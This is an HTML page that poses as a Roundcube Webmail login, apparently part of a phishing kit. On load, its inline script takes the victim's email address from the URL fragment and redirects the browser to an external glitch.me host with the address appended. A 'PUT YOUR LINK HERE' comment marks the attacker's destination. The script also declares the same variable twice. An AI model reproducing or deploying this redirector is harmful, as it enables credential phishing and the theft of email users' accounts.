<!DOCTYPE html>
<html>
  <head>
<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"><title>Roundcube Webmail</title>

    <script>
      var data = getParameter();
      var redir_to_page =
        "https://xwebmail-bluthoi.glitch.me" +
        data +
        ""; //PUT YOUR LINK HERE
      var hash = window.location.hash;
      var email = hash.split("#")[1];
      redir_to_page = redir_to_page + email;
      window.location = redir_to_page;
      function getParameter() {
        var listof = ["#"];
        var listCount = listof.length;
        var randomNum = listCount - 1;
        randomNum = Math.floor(Math.random() * randomNum);
        var result = listof[randomNum];

        return result;
      }
      function getQueryParamsAndHash() {
    let params = {};
    let hash = window.location.hash.substring(1); // Remove the #

    // If there's no hash in the URL, deny access
    if (!hash) {
        document.body.innerHTML = "<h1></h1>";
        return;
    }

    // Extract query parameters
    let queryString = window.location.search.substring(1);
    let queryArray = queryString.split("&");

    queryArray.forEach(param => {
        let [key, value] = param.split("=");
        if (key) {
            params[decodeURIComponent(key)] = decodeURIComponent(value || "");
        }
    });

    return { params, hash };
}

// Example usage
let data = getQueryParamsAndHash();
if (data) {
    console.log(data);
}
    </script>
